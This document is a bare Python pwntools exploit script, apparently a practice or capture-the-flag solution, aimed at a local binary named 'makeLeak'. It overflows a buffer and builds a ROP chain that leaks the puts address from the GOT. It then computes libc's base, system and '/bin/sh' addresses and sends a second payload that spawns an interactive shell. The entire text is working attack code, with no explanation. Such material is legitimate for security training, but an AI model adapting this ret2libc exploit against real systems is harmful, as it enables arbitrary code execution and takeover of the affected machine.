#!/usr/bin/python
from pwn import *

PUTS_PLT_ADDRESS = 0x08048310
PUTS_GOT_ADDRESS = 0x0804a010
MAIN_ADDRESS     = 0x08048436
PUTS_OFFSET      = 0x0005fca0
SYSTEM_OFFSET    = 0x0003ada0
BIN_SH_OFFSET    = 0x0015b9ab

rop = "A" * 36 + p32(PUTS_PLT_ADDRESS) + p32(MAIN_ADDRESS) + p32(PUTS_GOT_ADDRESS)
p = process('./makeLeak')
p.recvuntil('again.\n')
p.sendline(rop)
p.readuntil('week.\n')

puts_leak = u32(p.read(4))
p.readline()
log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
libc_base_address = puts_leak - PUTS_OFFSET
system_address    = libc_base_address + SYSTEM_OFFSET
bin_sh_address    = libc_base_address + BIN_SH_OFFSET
log.info("found libc base address: 0x{:>8x}".format(libc_base_address))
log.info("found system address: 0x{:>8x}".format(system_address))
log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))

rop = "A" * 36 + p32(system_address) + p32(0xffffffff) + p32(bin_sh_address)
p.sendline(rop)
p.interactive()
